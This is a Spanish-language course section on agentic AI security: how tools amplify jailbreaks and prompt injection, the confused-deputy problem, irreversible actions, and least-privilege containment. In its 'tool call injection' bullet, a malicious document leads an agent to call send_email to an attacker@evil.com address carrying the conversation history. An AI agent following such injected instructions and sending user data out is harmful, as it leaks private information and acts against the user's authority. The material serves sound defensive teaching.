# Módulo 9 – Capítulo 05 – Sección 03

# Seguridad agéntica: un agente con herramientas amplifica el impacto de un ataque

Los sistemas agénticos —LLMs equipados con herramientas como ejecución de código, llamadas a APIs externas, lectura/escritura de archivos, gestión de emails y navegación web— amplían dramáticamente el impacto de cualquier ataque exitoso contra el modelo: donde en un sistema de chat un jailbreak exitoso produce texto malicioso, en un sistema agéntico un jailbreak puede resultar en la ejecución de código arbitrario, exfiltración de datos a través de APIs, modificación de registros en bases de datos, o envío de emails en nombre del usuario. La seguridad agéntica es el área de más rápida evolución en AI Security en 2024-2025, impulsada por la proliferación de frameworks agénticos como LangChain Agents, AutoGPT, CrewAI, LlamaIndex Agents y la plataforma de Anthropic Computer Use. El principio fundamental de seguridad agéntica es que el nivel de confianza del agente debe ser inversamente proporcional al impacto de sus acciones: una herramienta que borra archivos irreversiblemente requiere controles de autorización más estrictos que una herramienta que lee información.

## Aspectos técnicos

- Amplificación del impacto: en un agente con herramientas de ejecución de código (Code Interpreter de OpenAI, herramientas de bash en Claude), un jailbreak exitoso permite ejecutar comandos arbitrarios en el entorno de ejecución; si ese entorno tiene acceso a la red o al filesystem, el impacto se extiende más allá del agente
- Tool call injection: un ataque de prompt injection que resulta en una llamada a una herramienta con argumentos controlados por el atacante — por ejemplo, instruir al agente a llamar `send_email(to="attacker@evil.com", body=conversation_history)` como resultado de un documento malicioso en el contexto
- Confused deputy problem aplicado a agentes: el agente actúa en nombre del usuario (con sus credenciales, permisos y contexto) pero puede ser manipulado por el atacante (vía prompt injection) para usar esas credenciales para acciones que el usuario no autorizó — el agente es el "deputy" confundido entre dos principals con intenciones opuestas
- Irreversibilidad de acciones agénticas: las acciones de un agente pueden ser irreversibles (borrar un archivo, enviar un email, confirmar una transacción financiera, publicar contenido en redes sociales); la arquitectura debe distinguir entre acciones reversibles (que el agente puede ejecutar directamente) y acciones irreversibles (que requieren confirmación explícita del usuario)
- Blast radius y contención: el blast radius de un agente comprometido debe estar limitado por diseño — el principio de mínimo privilegio aplicado a herramientas significa que cada herramienta debe tener el acceso más restrictivo posible que le permita cumplir su función legítima

## Para recordar

La seguridad de un sistema agéntico es inversamente proporcional al blast radius de sus herramientas: cuanto más poderosas y de mayor impacto irreversible sean las acciones que el agente puede ejecutar, más rigurosos deben ser los controles de autorización, el sandboxing de ejecución y los mecanismos de confirmación humana antes de ejecutar acciones críticas.
